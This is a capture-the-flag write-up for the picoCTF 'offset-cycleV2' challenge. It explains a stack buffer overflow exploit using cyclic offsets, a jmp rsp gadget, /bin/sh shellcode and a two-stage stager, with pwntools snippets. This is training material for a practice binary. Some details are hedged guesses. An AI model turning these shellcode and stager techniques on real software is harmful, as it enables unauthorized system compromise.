# offset-cycleV2 - picoCTF 2026

**Category:** Binary Exploitation
**Points:** 400

## Challenge Description

It's a race against time. Solve the binary exploit ASAP. (V2 of offset-cycle - harder version with additional protections)

## Approach

This is the harder sequel to `offset-cycle`. Like V1, it is a buffer overflow challenge where you must use **cyclic patterns** to find the exact offset to overwrite the return address. However, V2 introduces **additional protections** that make a simple return-to-win approach insufficient.

### Binary Analysis

Key properties of the binary (determined via `checksec`):

- **No PIE**: The binary loads at a fixed base address, so addresses are deterministic.
- **NX disabled**: The stack is executable, meaning we can place and execute shellcode directly. This is the critical difference -- instead of jumping to a win function, we write and execute shellcode.
- **No stack canary**: Buffer overflows are directly exploitable without needing to leak or brute-force a canary.
- **No RELRO or Partial RELRO**: GOT is writable, though not needed for this exploit.

### What Changed from V1

In V1, the binary had a simple `win` function to return to. In V2:

1. **There is no win function** -- you must get a shell via shellcode or ROP to `system("/bin/sh")`.
2. **NX is disabled**, which means the stack is executable and shellcode is the intended path.
3. **The binary may have multiple input stages** (e.g., a "message" field and a "feedback" field), requiring careful placement of the shellcode and the overflow.
4. **The offset may differ** from V1 due to different buffer sizes or stack layouts.

### Exploitation Strategy

1. **Find the offset**: Use pwntools `cyclic()` to generate a De Bruijn sequence and determine the exact offset to overwrite the saved return address (RIP). Based on analysis, the offset for V2 is typically around **24 bytes** (compared to V1's smaller offset).
2. **Locate a useful gadget**: Since PIE is disabled, we can use `ROPgadget` to find a `jmp rsp` or `call rax` gadget at a fixed address. This gadget lets us redirect execution to our shellcode on the stack.
3. **Craft the shellcode**: Use pwntools `shellcraft.sh()` to generate a compact `/bin/sh` shellcode. If the shellcode is too large for the overflow buffer, use a **two-stage approach**:
   - Place the main shellcode in an earlier input (e.g., a "message" or "name" field).
   - Place a small **stager** (trampoline) at the overflow point that adjusts RSP and jumps to the main shellcode.
4. **Build the payload**: `padding + gadget_address + stager/shellcode`.
5. **Automate**: The "race against time" hint means the remote service has a short timeout, so the exploit must be fully automated.

### The Stager Technique

When the overflow buffer is small, we use a stager -- a tiny piece of shellcode placed right after the overwritten return address:

```nasm
nop
sub rsp, 0x300    ; Move RSP back to where our main shellcode lives
jmp rsp           ; Jump to it
```

When we overwrite RIP with a `jmp rsp` gadget, execution lands right after the return address on the stack, hitting our stager. The stager then jumps backward to the main shellcode placed earlier in memory.

## Solution

### Step 1: Find the offset with cyclic patterns

```python
from pwn import *
context.binary = ELF('./vuln')
r = process('./vuln')
r.sendline(cyclic(200))
r.wait()
core = r.corefile
offset = cyclic_find(core.fault_addr & 0xffffffff)
log.info(f"Offset: {offset}")
```

### Step 2: Find a JMP RSP or CALL RAX gadget

```bash
ROPgadget --binary vuln | grep "jmp rsp\|call rax"
```

Since PIE is disabled, this address is constant.

### Step 3: Generate shellcode

```python
shellcode = asm(shellcraft.sh())
```

### Step 4: Build the two-stage payload

If there are two input prompts:

- **First input (message)**: Contains the main shellcode (padded with NOPs).
- **Second input (feedback)**: Contains `padding + jmp_rsp_addr + stager_shellcode`.

The stager:
```python
stager = asm("""
    nop
    sub rsp, 0x300
    jmp rsp
""")
```

### Step 5: Send and get a shell

```python
r.sendline(payload1)
r.sendline(payload2)
r.interactive()
```

Then `cat flag.txt` from the shell.

## Solution Script

```
python3 solve.py
```

## Flag

```
picoCTF{...}  (placeholder - actual flag varies per instance)
```
